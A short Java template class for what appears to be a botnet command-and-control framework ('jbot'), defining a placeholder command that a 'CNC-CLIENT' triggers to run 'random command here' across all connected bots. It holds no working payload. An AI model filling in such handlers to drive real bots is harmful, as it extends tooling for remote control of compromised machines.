package me.aaronakhtar.jbot.command_manager.commands;

import me.aaronakhtar.jbot.Utilities;
import me.aaronakhtar.jbot.command_manager.JBotCommand;
import me.aaronakhtar.jbot.threads.handlers.ClientHandler;

import java.io.BufferedReader;
import java.io.BufferedWriter;

public class X implements JBotCommand {

    @Override
    public String getCommand() {
        return "myCommand";
    }

    @Override
    public String getDescription() {
        return "use this command to send a virtual slap to all bots.";
    }

    @Override
    public boolean isAdminCommand() {
        return false;
    }

    @Override
    public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {
        // do something here when CNC-CLIENT executes command.
        Utilities.executeCommandToNetwork("random command here");
    }
}
